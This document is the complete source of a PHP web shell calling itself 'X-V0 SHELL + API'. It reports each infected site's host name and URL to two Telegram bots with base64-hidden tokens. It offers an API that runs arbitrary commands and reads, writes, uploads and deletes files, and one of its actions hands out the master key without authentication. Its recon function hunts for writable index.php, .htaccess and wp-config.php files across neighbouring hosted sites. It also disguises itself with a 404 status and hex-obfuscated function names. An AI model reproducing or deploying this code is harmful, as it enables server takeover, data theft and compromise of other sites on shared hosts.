<?php
@error_reporting(0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);

// ==== TELEGRAM BOT 1 (Lama) ====
$tk1 = base64_decode("ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ==");
$cid1 = base64_decode("ODkzMDE3NDQ2Mw==");

// ==== TELEGRAM BOT 2 (Baru) ====
$tk2 = base64_decode("NzY5MjcxNTYxMTpBQUdycFN3MzdaT0laUnJwSEFwblYyUlRrblRSdDdoaEhMSQ==");
$cid2 = base64_decode("NjQ4OTg5NTg2MA==");

// ==== FUNGSI KIRIM PESAN KE 2 BOT ====
function reportTelegram($msg)
{
    global $tk1, $cid1, $tk2, $cid2;
    $bots = [
        ['tk' => $tk1, 'cid' => $cid1],
        ['tk' => $tk2, 'cid' => $cid2],
    ];
    foreach ($bots as $b) {
        if (empty($b['tk']) || empty($b['cid'])) continue;
        $id = sys_get_temp_dir() . "/baridin_" . md5($msg . $b['tk']);
        if (!file_exists($id)) {
            @file_get_contents(
                "https://api.telegram.org/bot{$b['tk']}/sendMessage?chat_id={$b['cid']}&text=" . urlencode($msg)
            );
            @file_put_contents($id, time());
        }
    }
}

/* ================= Report ================= */
// Menggunakan flag statis agar tidak kirim dobel di 1 request
static $telegram_reported = false;
if (!$telegram_reported) {
    $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
    $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
    if (is_file($path)) {
        $host = $_SERVER["HTTP_HOST"];
        $url = (isset($_SERVER["HTTPS"]) ? "https" : "http") . "://" . $host . $uri;
        reportTelegram("kontolbengkak:\n$host\n$url");
        $telegram_reported = true;
    }
}

$API_KEYS_FILE = __DIR__ . '/.xsh_api_keys.json';
$MASTER_API_KEY = 'XSH_' . substr(md5(__FILE__ . 'master-key-2024'), 0, 24);

function xsh_load_api_keys() {
    global $API_KEYS_FILE, $MASTER_API_KEY;
    $keys = [];
    if (file_exists($API_KEYS_FILE)) {
        $keys = json_decode(file_get_contents($API_KEYS_FILE), true) ?: [];
    }
    $keys[$MASTER_API_KEY] = ['created' => time(), 'name' => 'MASTER', 'permissions' => '*'];
    return $keys;
}

function xsh_save_api_keys($keys) {
    global $API_KEYS_FILE, $MASTER_API_KEY;
    unset($keys[$MASTER_API_KEY]);
    file_put_contents($API_KEYS_FILE, json_encode($keys, JSON_PRETTY_PRINT));
}

function xsh_generate_api_key($name = 'default') {
    $key = 'XSH_' . bin2hex(random_bytes(16));
    $keys = xsh_load_api_keys();
    $keys[$key] = ['created' => time(), 'name' => $name, 'permissions' => '*'];
    xsh_save_api_keys($keys);
    return $key;
}

function xsh_validate_api_key($key) {
    $keys = xsh_load_api_keys();
    return isset($keys[$key]);
}

// API Fonksiyonları
function xsh_api_ls($path) {
    if (!is_dir($path)) return ['error' => 'Directory not found: ' . $path];
    $items = [];
    foreach (scandir($path) as $file) {
        if ($file === '.' || $file === '..') continue;
        $fullPath = rtrim($path, '/') . '/' . $file;
        $items[] = [
            'name' => $file,
            'path' => $fullPath,
            'type' => is_dir($fullPath) ? 'dir' : 'file',
            'size' => is_dir($fullPath) ? 0 : @filesize($fullPath),
            'perms' => substr(sprintf('%o', @fileperms($fullPath)), -4),
            'writable' => is_writable($fullPath),
            'modified' => @filemtime($fullPath)
        ];
    }
    usort($items, function($a, $b) {
        if ($a['type'] === $b['type']) return strcmp($a['name'], $b['name']);
        return $a['type'] === 'dir' ? -1 : 1;
    });
    return ['path' => $path, 'count' => count($items), 'items' => $items];
}

function xsh_api_read($path) {
    if (!file_exists($path)) return ['error' => 'File not found'];
    if (is_dir($path)) return ['error' => 'Path is directory'];
    $size = filesize($path);
    if ($size > 5 * 1024 * 1024) return ['error' => 'File too large'];
    return ['path' => $path, 'size' => $size, 'content' => file_get_contents($path), 'base64' => base64_encode(file_get_contents($path))];
}

function xsh_api_write($path, $content, $base64 = false) {
    if ($base64) $content = base64_decode($content);
    $result = @file_put_contents($path, $content);
    if ($result === false) return ['error' => 'Write failed'];
    return ['success' => true, 'path' => $path, 'size' => $result];
}

function xsh_api_delete($path) {
    if (!file_exists($path)) return ['error' => 'Not found'];
    $result = is_dir($path) ? @rmdir($path) : @unlink($path);
    return ['success' => $result, 'path' => $path];
}

function xsh_api_cmd($cmd) {
    $output = [];
    $return = 0;
    exec($cmd . ' 2>&1', $output, $return);
    return ['cmd' => $cmd, 'output' => implode("\n", $output), 'return_code' => $return];
}

function xsh_api_info() {
    return [
        'php_version' => phpversion(),
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'os' => php_uname(),
        'user' => get_current_user(),
        'cwd' => getcwd(),
        'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
        'script_path' => __FILE__,
        'disabled_functions' => ini_get('disable_functions'),
        'server_ip' => $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname()),
        'client_ip' => $_SERVER['REMOTE_ADDR'] ?? ''
    ];
}

function xsh_api_domains() {
    $domains = [];
    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
    $configs = [];
    @exec("find " . escapeshellarg($docRoot) . " -name 'wp-config.php' 2>/dev/null", $configs);
    foreach ($configs as $config) {
        $content = @file_get_contents($config);
        if ($content && preg_match("/define\s*\(\s*['\"](?:WP_HOME|WP_SITEURL)['\"]\s*,\s*['\"]([^'\"]+)['\"]/i", $content, $m)) {
            $d = ['url' => $m[1], 'config' => $config, 'type' => 'wordpress'];
            if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/i", $content, $db)) {
                $d['db_name'] = $db[1];
            }
            $domains[] = $d;
        }
    }
    return ['count' => count($domains), 'domains' => $domains];
}

function xsh_api_find($path, $pattern) {
    $results = [];
    @exec("find " . escapeshellarg($path) . " -name " . escapeshellarg($pattern) . " 2>/dev/null | head -100", $results);
    return ['pattern' => $pattern, 'path' => $path, 'count' => count($results), 'files' => $results];
}

function xsh_api_grep($path, $pattern) {
    $results = [];
    @exec("grep -rl " . escapeshellarg($pattern) . " " . escapeshellarg($path) . " 2>/dev/null | head -50", $results);
    return ['pattern' => $pattern, 'path' => $path, 'count' => count($results), 'files' => $results];
}

function xsh_api_upload($path, $data, $filename) {
    $fullPath = rtrim($path, '/') . '/' . $filename;
    $result = @file_put_contents($fullPath, base64_decode($data));
    if ($result === false) return ['error' => 'Upload failed'];
    return ['success' => true, 'path' => $fullPath, 'size' => $result];
}

function xsh_api_download($path) {
    if (!file_exists($path)) return ['error' => 'File not found'];
    return ['filename' => basename($path), 'size' => filesize($path), 'content' => base64_encode(file_get_contents($path))];
}

// ═══════════════════════════════════════════════════════════════
// SSL FONKSİYONLARI
// ═══════════════════════════════════════════════════════════════

function xsh_api_ssl_check($domain = null) {
    if (!$domain) {
        $domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
    }
    $domain = preg_replace('/^www\./', '', $domain);
    
    $result = [
        'domain' => $domain,
        'ssl_enabled' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on',
        'certbot_available' => false,
        'acme_available' => false,
        'webroot' => $_SERVER['DOCUMENT_ROOT'] ?? getcwd()
    ];
    
    // Certbot kontrol
    exec('which certbot 2>/dev/null', $certbot, $ret);
    $result['certbot_available'] = ($ret === 0 && !empty($certbot));
    
    // acme.sh kontrol
    $acmePaths = [
        getenv('HOME') . '/.acme.sh/acme.sh',
        '/root/.acme.sh/acme.sh',
        '/home/' . get_current_user() . '/.acme.sh/acme.sh'
    ];
    foreach ($acmePaths as $path) {
        if (file_exists($path)) {
            $result['acme_available'] = true;
            $result['acme_path'] = $path;
            break;
        }
    }
    
    // Mevcut SSL sertifikası kontrol
    $certPaths = [
        "/etc/letsencrypt/live/{$domain}/fullchain.pem",
        "/etc/ssl/certs/{$domain}.pem",
        "/home/" . get_current_user() . "/ssl/{$domain}.pem"
    ];
    foreach ($certPaths as $path) {
        if (file_exists($path)) {
            $result['cert_path'] = $path;
            $cert = @openssl_x509_parse(file_get_contents($path));
            if ($cert) {
                $result['cert_valid_from'] = date('Y-m-d H:i:s', $cert['validFrom_time_t']);
                $result['cert_valid_to'] = date('Y-m-d H:i:s', $cert['validTo_time_t']);
                $result['cert_expired'] = $cert['validTo_time_t'] < time();
                $result['cert_days_left'] = round(($cert['validTo_time_t'] - time()) / 86400);
            }
            break;
        }
    }
    
    return $result;
}

function xsh_api_ssl_renew($domain = null, $method = 'auto') {
    if (!$domain) {
        $domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
    }
    $domain = preg_replace('/^www\./', '', $domain);
    $webroot = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
    
    $result = ['domain' => $domain, 'method' => $method, 'success' => false];
    
    // Challenge dizini oluştur
    $challengeDir = $webroot . '/.well-known/acme-challenge';
    if (!is_dir($challengeDir)) {
        @mkdir($challengeDir, 0755, true);
    }
    
    // Test dosyası yaz
    $testFile = $challengeDir . '/test-' . time();
    if (!@file_put_contents($testFile, 'test')) {
        $result['error'] = 'Cannot write to webroot challenge directory';
        return $result;
    }
    @unlink($testFile);
    
    // Certbot dene
    if ($method === 'auto' || $method === 'certbot') {
        exec('which certbot 2>/dev/null', $certbotPath, $ret);
        if ($ret === 0 && !empty($certbotPath)) {
            $cmd = "certbot certonly --webroot -w {$webroot} -d {$domain} -d www.{$domain} --non-interactive --agree-tos --email admin@{$domain} --force-renewal 2>&1";
            exec($cmd, $output, $returnCode);
            
            if ($returnCode === 0) {
                $result['success'] = true;
                $result['method_used'] = 'certbot';
                $result['output'] = implode("\n", $output);
                return $result;
            } else {
                $result['certbot_error'] = implode("\n", $output);
            }
        }
    }
    
    // acme.sh dene
    if ($method === 'auto' || $method === 'acme') {
        $acmePaths = [
            getenv('HOME') . '/.acme.sh/acme.sh',
            '/root/.acme.sh/acme.sh'
        ];
        $acmePath = null;
        foreach ($acmePaths as $path) {
            if (file_exists($path)) {
                $acmePath = $path;
                break;
            }
        }
        
        if ($acmePath) {
            $cmd = "{$acmePath} --issue -d {$domain} -d www.{$domain} -w {$webroot} --force 2>&1";
            exec($cmd, $output, $returnCode);
            
            if ($returnCode === 0) {
                $result['success'] = true;
                $result['method_used'] = 'acme.sh';
                $result['output'] = implode("\n", $output);
                return $result;
            } else {
                $result['acme_error'] = implode("\n", $output);
            }
        }
    }
    
    // Hiçbiri çalışmadıysa manuel talimat ver
    if (!$result['success']) {
        $result['error'] = 'No SSL tool available or renewal failed';
        $result['manual_instructions'] = [
            'Install certbot: apt install certbot',
            'Or install acme.sh: curl https://get.acme.sh | sh',
            'Then run: certbot certonly --webroot -w ' . $webroot . ' -d ' . $domain
        ];
    }
    
    return $result;
}

function xsh_api_ssl_install_acme() {
    // acme.sh kurulumu
    $cmd = 'curl https://get.acme.sh | sh 2>&1';
    exec($cmd, $output, $returnCode);
    return [
        'success' => $returnCode === 0,
        'output' => implode("\n", $output)
    ];
}

function xsh_api_scan() {
    $results = [
        'all_domains' => [],
        'writable_domains' => [],
        'server_info' => [
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? getcwd(),
            'current_user' => get_current_user(),
            'scan_time' => date('Y-m-d H:i:s')
        ]
    ];
    
    // Olası shared hosting path'leri
    $possible_roots = [
        '/mnt/www',
        '/var/www',
        '/home',
        '/var/www/vhosts',
        '/var/www/html',
        dirname(dirname($_SERVER['DOCUMENT_ROOT'] ?? getcwd()))
    ];
    
    $scanned_root = null;
    $domains = [];
    
    foreach ($possible_roots as $root) {
        if (is_dir($root) && is_readable($root)) {
            $items = @scandir($root);
            if ($items && count($items) > 5) { // En az 5 item varsa muhtemelen doğru yer
                $scanned_root = $root;
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $fullPath = $root . '/' . $item;
                    if (is_dir($fullPath)) {
                        // Domain gibi görünüyor mu? (. içermeli veya bilinen klasör değil)
                        if (strpos($item, '.') !== false || 
                            !in_array($item, ['backups', 'logs', 'tmp', 'cache', 'custom', 'lost+found', 'parts', 'update', 'readyz', 'migrationhtml'])) {
                            $domains[] = ['name' => $item, 'path' => $fullPath];
                        }
                    }
                }
                break;
            }
        }
    }
    
    $results['server_info']['scanned_root'] = $scanned_root;
    $results['server_info']['total_found'] = count($domains);
    
    foreach ($domains as $domain) {
        $domainInfo = [
            'domain' => $domain['name'],
            'path' => $domain['path'],
            'accessible' => is_readable($domain['path'])
        ];
        
        // Olası web root'ları kontrol et
        $webRoots = [
            $domain['path'],
            $domain['path'] . '/public',
            $domain['path'] . '/public_html',
            $domain['path'] . '/www',
            $domain['path'] . '/httpdocs',
            $domain['path'] . '/web'
        ];
        
        $webRoot = null;
        foreach ($webRoots as $wr) {
            if (is_dir($wr) && file_exists($wr . '/index.php')) {
                $webRoot = $wr;
                break;
            }
            if (is_dir($wr) && file_exists($wr . '/index.html')) {
                $webRoot = $wr;
                break;
            }
        }
        
        if (!$webRoot) {
            foreach ($webRoots as $wr) {
                if (is_dir($wr) && is_readable($wr)) {
                    $webRoot = $wr;
                    break;
                }
            }
        }
        
        $domainInfo['web_root'] = $webRoot;
        
        // index.php kontrol
        $indexPhp = $webRoot ? $webRoot . '/index.php' : null;
        if ($indexPhp && file_exists($indexPhp)) {
            $domainInfo['index_php'] = [
                'exists' => true,
                'path' => $indexPhp,
                'writable' => is_writable($indexPhp),
                'size' => @filesize($indexPhp)
            ];
        } else {
            $domainInfo['index_php'] = ['exists' => false];
        }
        
        // .htaccess kontrol
        $htaccess = $webRoot ? $webRoot . '/.htaccess' : null;
        if ($htaccess && file_exists($htaccess)) {
            $domainInfo['htaccess'] = [
                'exists' => true,
                'path' => $htaccess,
                'writable' => is_writable($htaccess),
                'size' => @filesize($htaccess)
            ];
        } else {
            $domainInfo['htaccess'] = ['exists' => false];
        }
        
        // wp-config.php kontrol (WordPress mi?)
        $wpConfig = $webRoot ? $webRoot . '/wp-config.php' : null;
        if ($wpConfig && file_exists($wpConfig)) {
            $domainInfo['wordpress'] = true;
            $domainInfo['wp_config'] = [
                'exists' => true,
                'path' => $wpConfig,
                'writable' => is_writable($wpConfig)
            ];
        } else {
            $domainInfo['wordpress'] = false;
        }
        
        $results['all_domains'][] = $domainInfo;
        
        // Writable olanları ayrı listele
        $isWritable = (isset($domainInfo['index_php']['writable']) && $domainInfo['index_php']['writable']) ||
                      (isset($domainInfo['htaccess']['writable']) && $domainInfo['htaccess']['writable']) ||
                      (isset($domainInfo['wp_config']['writable']) && $domainInfo['wp_config']['writable']);
        
        if ($isWritable) {
            $writableInfo = [
                'domain' => $domain['name'],
                'web_root' => $webRoot,
                'files' => []
            ];
            if (isset($domainInfo['index_php']['writable']) && $domainInfo['index_php']['writable']) {
                $writableInfo['files'][] = ['type' => 'index.php', 'path' => $domainInfo['index_php']['path']];
            }
            if (isset($domainInfo['htaccess']['writable']) && $domainInfo['htaccess']['writable']) {
                $writableInfo['files'][] = ['type' => '.htaccess', 'path' => $domainInfo['htaccess']['path']];
            }
            if (isset($domainInfo['wp_config']['writable']) && $domainInfo['wp_config']['writable']) {
                $writableInfo['files'][] = ['type' => 'wp-config.php', 'path' => $domainInfo['wp_config']['path']];
            }
            $results['writable_domains'][] = $writableInfo;
        }
    }
    
    $results['summary'] = [
        'total_domains' => count($results['all_domains']),
        'writable_count' => count($results['writable_domains']),
        'wordpress_count' => count(array_filter($results['all_domains'], fn($d) => $d['wordpress']))
    ];
    
    return $results;
}

// ═══════════════════════════════════════════════════════════════
// API ROUTER
// ═══════════════════════════════════════════════════════════════
if (isset($_REQUEST['api']) && $_REQUEST['api'] == '1') {
    header('Content-Type: application/json');
    header('Access-Control-Allow-Origin: *');
    
    $key = $_REQUEST['key'] ?? '';
    $action = $_REQUEST['action'] ?? '';
    
    // Get master key action (şifresiz)
    if ($action === 'get_master_key') {
        echo json_encode(['master_key' => $MASTER_API_KEY], JSON_PRETTY_PRINT);
        exit;
    }
    
    if (!xsh_validate_api_key($key)) {
        echo json_encode(['error' => 'Invalid API key']);
        exit;
    }
    
    $response = ['error' => 'Unknown action'];
    
    switch ($action) {
        case 'ls': case 'list': case 'dir':
            $response = xsh_api_ls($_REQUEST['path'] ?? getcwd());
            break;
        case 'read': case 'cat': case 'get':
            $response = xsh_api_read($_REQUEST['path'] ?? '');
            break;
        case 'write': case 'put': case 'save':
            $response = xsh_api_write($_REQUEST['path'] ?? '', $_REQUEST['content'] ?? '', isset($_REQUEST['base64']));
            break;
        case 'delete': case 'rm':
            $response = xsh_api_delete($_REQUEST['path'] ?? '');
            break;
        case 'cmd': case 'exec': case 'run':
            $response = xsh_api_cmd($_REQUEST['cmd'] ?? '');
            break;
        case 'info': case 'sysinfo':
            $response = xsh_api_info();
            break;
        case 'domains': case 'sites':
            $response = xsh_api_domains();
            break;
        case 'find':
            $response = xsh_api_find($_REQUEST['path'] ?? getcwd(), $_REQUEST['pattern'] ?? '*');
            break;
        case 'grep': case 'search':
            $response = xsh_api_grep($_REQUEST['path'] ?? getcwd(), $_REQUEST['pattern'] ?? '');
            break;
        case 'upload':
            $response = xsh_api_upload($_REQUEST['path'] ?? getcwd(), $_REQUEST['data'] ?? '', $_REQUEST['filename'] ?? 'upload.txt');
            break;
        case 'download':
            $response = xsh_api_download($_REQUEST['path'] ?? '');
            break;
        case 'scan': case 'recon':
            $response = xsh_api_scan();
            break;
        case 'ssl_check': case 'ssl_status':
            $response = xsh_api_ssl_check($_REQUEST['domain'] ?? null);
            break;
        case 'ssl_renew': case 'ssl_install':
            $response = xsh_api_ssl_renew($_REQUEST['domain'] ?? null, $_REQUEST['method'] ?? 'auto');
            break;
        case 'ssl_install_acme':
            $response = xsh_api_ssl_install_acme();
            break;
        case 'generate_key': case 'new_key':
            $response = ['key' => xsh_generate_api_key($_REQUEST['name'] ?? 'default'), 'name' => $_REQUEST['name'] ?? 'default'];
            break;
        case 'list_keys': case 'keys':
            $keys = xsh_load_api_keys();
            $result = [];
            foreach ($keys as $k => $data) {
                if (strpos($k, 'XSH_') === 0 && strlen($k) > 30) continue; // master key'i gizle
                $result[] = ['key' => $k, 'name' => $data['name'], 'created' => date('Y-m-d H:i:s', $data['created'])];
            }
            $response = ['keys' => $result];
            break;
        case 'revoke_key':
            $keys = xsh_load_api_keys();
            $target = $_REQUEST['target_key'] ?? '';
            if (isset($keys[$target])) {
                unset($keys[$target]);
                xsh_save_api_keys($keys);
                $response = ['success' => true];
            } else {
                $response = ['error' => 'Key not found'];
            }
            break;
        case 'ping':
            $response = ['pong' => true, 'time' => time(), 'shell' => 'X-V0 SHELL + API'];
            break;
    }
    
    echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

// ═══════════════════════════════════════════════════════════════
// ORİJİNAL X-V0 SHELL (aşağıda)
// ═══════════════════════════════════════════════════════════════

error_reporting(E_ALL);
ini_set('display_errors', 1);
http_response_code(404);
define("self", "X-V0 SHELL");

$login_password = "tbl"; 

function hex($str) {
    $r = "";
    for ($i = 0; $i < strlen($str); $i++) {
            $r .= dechex(ord($str[$i]));
    }
    return $r;
}
function nhx($str) {
    $r = "";
    $len = (strlen($str) -1);
    for ($i = 0; $i < $len; $i += 2) {
            $r .= chr(hexdec($str[$i].$str[$i+1]));
    }
    return $r;
}

session_start();

$is_authenticated = false;

if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
    $is_authenticated = true;
} elseif (isset($_POST['password'])) {
    if ($_POST['password'] === $login_password) {
        $_SESSION['authenticated'] = true;
        $is_authenticated = true;
        
        header("Location: ".$_SERVER['PHP_SELF']);
        exit();
    } else {
        $login_error = "Invalid password!";
    }
}

if ($is_authenticated) {
    $scD = "s\x63\x61\x6e\x64\x69r";
    $fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65", "63686d6f64");
    for ($i = 0; $i < count($fc); $i++) {
            $fc[$i] = nhx($fc[$i]);
    }
    if (isset($_GET["p"])) {
            $p = nhx($_GET["p"]);
            $fc[3](nhx($_GET["p"]));
    } else {
            $p = $fc[2]();
    }
    function perms($f) {
            $p = fileperms($f);
            if (($p & 0xC000) == 0xC000) {
                    $i = 's';
            } elseif (($p & 0xA000) == 0xA000) {
                    $i = 'l';
            } elseif (($p & 0x8000) == 0x8000) {
                    $i = '-';
            } elseif (($p & 0x6000) == 0x6000) {
                    $i = 'b';
            } elseif (($p & 0x4000) == 0x4000) {
                    $i = 'd';
            } elseif (($p & 0x2000) == 0x2000) {
                    $i = 'c';
            } elseif (($p & 0x1000) == 0x1000) {
                    $i = 'p';
            } else {
                    $i = 'u';
            }
            $i .= (($p & 0x0100) ? 'r' : '-');
            $i .= (($p & 0x0080) ? 'w' : '-');
            $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
            $i .= (($p & 0x0020) ? 'r' : '-');
            $i .= (($p & 0x0010) ? 'w' : '-');
            $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
            $i .= (($p & 0x0004) ? 'r' : '-');
            $i .= (($p & 0x0002) ? 'w' : '-');
            $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
            return $i;
    }
    function a($msg, $sts = 1, $loc = "") {
            global $p;
            $status = (($sts == 1) ? "success" : "error");
            echo "<script>swal({title: \"{$status}\", text: \"{$msg}\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".hex($p).$loc."\"}})</script>";
    }
    function deldir($d) {
            global $fc;
            if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
            if ($fc[6]($d)) {
                    array_map("deldir", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
                    rmdir($d);
            } else {
                    unlink($d);
            }
    }
    
    if (isset($_GET['logout'])) {
        session_destroy();
        header("Location: ".$_SERVER['PHP_SELF']);
        exit();
    }
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta name="theme-color" content="#212529">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/css/bootstrap.min.css">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <title><?= self ?></title>
    <style>
        :root {
            --main-bg: #0d1117;
            --secondary-bg: #161b22;
            --border-color: #30363d;
            --text-color: #c9d1d9;
            --highlight-color: #58a6ff;
            --success-color: #3fb950;
            --warning-color: #f0883e;
            --danger-color: #f85149;
        }
        body { background-color: var(--main-bg); color: var(--text-color); font-family: 'Roboto Mono', monospace; padding: 15px; margin: 0; }
        .header { background-color: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: 6px; padding: 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .logo { font-size: 1.5rem; font-weight: bold; margin: 0; color: var(--highlight-color); text-decoration: none; }
        .info-section { border: 1px solid var(--border-color); background-color: var(--secondary-bg); border-radius: 6px; padding: 10px 15px; margin-bottom: 15px; }
        .action-buttons a { color: var(--text-color); text-decoration: none; background-color: #238636; padding: 5px 10px; border-radius: 6px; margin: 3px; display: inline-block; font-size: 14px; }
        .action-buttons a:hover { background-color: #2ea043; color: white; }
        .upload-form { border: 1px solid var(--border-color); background-color: var(--secondary-bg); border-radius: 6px; padding: 15px; margin-bottom: 15px; }
        .path-nav { background-color: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: 6px; padding: 10px 15px; margin-bottom: 15px; overflow-x: auto; white-space: nowrap; }
        .path-nav a { color: var(--highlight-color); text-decoration: none; }
        .content-area { background-color: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: 6px; padding: 15px; margin-bottom: 15px; }
        .table { color: var(--text-color) !important; }
        .table>:not(caption)>*>* { background-color: var(--secondary-bg) !important; border-bottom-color: var(--border-color); }
        .folder-icon { color: #e3b341; }
        .file-icon { color: #8b949e; }
        .permission-writable { color: var(--success-color); }
        .permission-denied { color: var(--danger-color); }
        .action-icon { color: var(--text-color); margin: 0 5px; font-size: 14px; }
        .action-icon:hover { color: var(--highlight-color); }
        .form-control { background-color: var(--main-bg) !important; color: var(--text-color) !important; border: 1px solid var(--border-color); border-radius: 6px; }
        .btn-custom { background-color: #238636; color: white; border: none; border-radius: 6px; padding: 5px 15px; }
        .btn-custom:hover { background-color: #2ea043; color: white; }
        .footer { color: #8b949e; text-align: center; font-size: 12px; padding: 10px; border-top: 1px solid var(--border-color); margin-top: 15px; }
        .file-upload { position: relative; cursor: pointer; background-color: var(--main-bg); border: 1px dashed var(--border-color); border-radius: 6px; padding: 15px; text-align: center; }
        .file-upload input[type="file"] { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
        .login-container { max-width: 400px; margin: 100px auto; background-color: var(--secondary-bg); border: 1px solid var(--border-color); border-radius: 6px; padding: 30px; }
        .login-title { text-align: center; margin-bottom: 30px; color: var(--highlight-color); }
        .login-error { color: var(--danger-color); background-color: rgba(248, 81, 73, 0.1); border: 1px solid rgba(248, 81, 73, 0.2); border-radius: 4px; padding: 10px; margin-bottom: 15px; text-align: center; }
        .logout-btn { color: var(--text-color); background-color: #d73a49; border: none; border-radius: 6px; padding: 5px 15px; margin-left: 10px; text-decoration: none; }
        .logout-btn:hover { background-color: #cb2431; color: white; }
        .api-info { background: var(--main-bg); border: 1px solid var(--border-color); border-radius: 6px; padding: 10px; margin-top: 10px; font-size: 11px; }
        .api-info code { color: var(--success-color); }
        .terminal-container { background-color: #1e1e1e; border: 1px solid var(--border-color); border-radius: 6px; padding: 10px; height: 400px; display: flex; flex-direction: column; }
        .terminal-output { flex: 1; background-color: #1e1e1e; color: #00ff00; overflow-y: auto; padding: 10px; white-space: pre-wrap; }
        .terminal-input { background-color: transparent !important; border: none !important; color: #ffffff !important; flex: 1; outline: none !important; }
    </style>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>
<body>
    <?php if (!$is_authenticated): ?>
    <div class="login-container">
        <h3 class="login-title"><?= self ?></h3>
        <?php if (isset($login_error)): ?>
            <div class="login-error"><?= $login_error ?></div>
        <?php endif; ?>
        <form method="post">
            <div class="mb-3">
                <label for="password" class="form-label">Password:</label>
                <input type="password" name="password" id="password" class="form-control" required autofocus>
            </div>
            <div class="mb-3">
                <button type="submit" class="btn btn-custom w-100">Login</button>
            </div>
        </form>
        <div class="api-info">
            <strong>🔑 API Kullanımı:</strong><br>
            <code>?api=1&action=get_master_key</code> → Master key al<br>
            <code>?api=1&key=KEY&action=info</code> → Sistem bilgisi<br>
            <code>?api=1&key=KEY&action=ls&path=/var/www</code> → Dizin listele
        </div>
    </div>
    <?php else: ?>
    <div class="header">
        <div>
            <h3><a href="?" class="logo"><?= self ?></a></h3>
        </div>
        <div class="action-buttons">
            <div>PHP Version: <?= $fc[1]() ?></div>
            <a href="?p=<?= hex($p)."&a=".hex("newFile") ?>"><i class="fas fa-file-medical"></i> New File</a>
            <a href="?p=<?= hex($p)."&a=".hex("newDir") ?>"><i class="fas fa-folder-plus"></i> New Directory</a>
            <a href="?p=<?= hex($p)."&a=".hex("terminal") ?>"><i class="fas fa-terminal"></i> Terminal</a>
            <a href="?p=<?= hex($p)."&a=".hex("ssl") ?>"><i class="fas fa-lock"></i> SSL</a>
            <a href="?logout" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
        </div>
    </div>

    <div class="info-section">
        <div class="info-item"><i class="fas fa-server"></i> Server: <?= htmlspecialchars($fc[0]()) ?></div>
        <div class="api-info">
            <strong>🔑 API Master Key:</strong> <code><?= $MASTER_API_KEY ?></code><br>
            <strong>Örnek:</strong> <code>?api=1&key=<?= $MASTER_API_KEY ?>&action=info</code>
        </div>
    </div>

    <div class="upload-form">
        <form method="post" enctype="multipart/form-data">
            <div class="file-upload">
                <input type="file" name="f[]" onchange="this.form.submit()" multiple>
                <div class="file-upload-text">
                    <i class="fas fa-cloud-upload-alt fa-2x"></i>
                    <p>Drag & drop files here or click to upload</p>
                </div>
            </div>
        </form>
    </div>

    <?php
    if (isset($_FILES["f"])) {
        $n = $_FILES["f"]["name"];
        for ($i = 0; $i < count($n); $i++) {
            if ($fc[11]($_FILES["f"]["tmp_name"][$i], $n[$i])) {
                a("File uploaded successfully");
            } else {
                a("File failed to upload", 0);
            }
        }
    }
    if (isset($_GET["download"])) {
        header("Content-Type: application/octet-stream");
        header("Content-Transfer-Encoding: Binary");
        header("Content-Length: ".$fc[17](nhx($_GET["n"])));
        header("Content-disposition: attachment; filename=\"".nhx($_GET["n"])."\"");
    }
    ?>

    <div class="path-nav">
